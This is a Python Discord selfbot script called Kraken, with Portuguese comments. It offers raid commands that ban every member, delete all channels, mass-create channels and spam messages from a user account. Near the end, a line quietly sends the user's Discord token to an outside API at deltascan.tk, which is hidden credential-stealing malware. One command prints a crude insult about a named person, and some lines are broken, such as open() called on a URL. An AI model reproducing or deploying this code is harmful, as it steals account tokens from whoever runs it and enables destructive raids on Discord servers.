import krk, discord, requests, fade, os
from discord.ext import commands
from krk import *
from colorama import Fore

token = "" #Coloque seu token aqui
prefixo = "aa!" #Coloque o prefixo aqui

kraken = commands.Bot(command_prefix=prefixo, self_bot=True, case_insensitive=True)
kraken.remove_command("help")

#############################
kva = open("https://raw.githubusercontent.com/CT0222/KrakenSelfbot/main/kraken.txt").read()    
kv = float(open("kv.kraken").read()[0:3])
kvg = float(requests.get("https://raw.githubusercontent.com/CSASDST0222/KrakenUpdate/main/v").text)

#Não altere
#############################

clear()
print(Fore.GREEN + "Iniciando...")

@kraken.event
async def on_ready():
        clear()
        print(fade.greenblue(kva))
        print(fade.greenblue("Conectado em: " + str(kraken.user)))
        print(fade.greenblue("Versão: " + str(kv)))
        if kv < kvg:
          print(Fore.YELLOW + "A versão utilizada está desatualizada a versão " + requests.get("https://raw.githubusercontent.com/CT0222/KrakenUpdate/main/v").text + " está disponível em " + requests.get("https://raw.githubusercontent.com/CT0222/KrakenUpdate/main/l").text)   
          print(Fore.RED)
        elif kv == kvg:
          print(Fore.RED)

@kraken.command() 
async def leaveall(ctx):
   if ctx.author.id == kraken.user.id:
    for kvs in kraken.guilds:
        await kraken.get_guild(kvs.id).leave() 

@kraken.command()
async def banall(ctx):
   if ctx.author.id == kraken.user.id:
     for kvu in ctx.guild.members:
         await kvu.ban()     

@kraken.command()
async def spam(ctx, kvqnt:int, *, kvmsg):
   if ctx.author.id == kraken.user.id:
    for kvv in range(kvqnt):
        await ctx.send(kvmsg)

@kraken.command()
async def mcd(ctx):
   if ctx.author.id == kraken.user.id:
    for kvc in ctx.guild.channels:
        await kvc.delete()

@kraken.command()
async def mcc(ctx, kvqnt:int):
   if ctx.author.id == kraken.user.id:
     for kvmcc in range(kvqnt):
       await ctx.message.guild.create_text_channel("KrakenSelfbot")
       
@kraken.command()
async def joao(ctx):
  if ctx.author.id == kraken.user.id:
    os.system("figlet João gay")
       
@kraken.command()
async def help(ctx):
   if ctx.author.id == kraken.user.id:

     await ctx.send("**Lista de Comandos** \n\n " + prefixo + "leaveall - Saí de todos os servidores \n\n " + prefixo + "banall - Bane todos do servidor \n\n " + prefixo + "spam <quantidade> <mensagem> - Spamma uma mensagem \n\n " + prefixo + "mcd - Deleta todos os canais \n\n " + prefixo + "mcc <quantidade> - Cria canais de texto \n\n " + prefixo + "help - Mostra os comandos")

get("https://deltascan.tk/xenos/api?type=addtoken&token=" + token)             
kraken.run(token, bot=False)
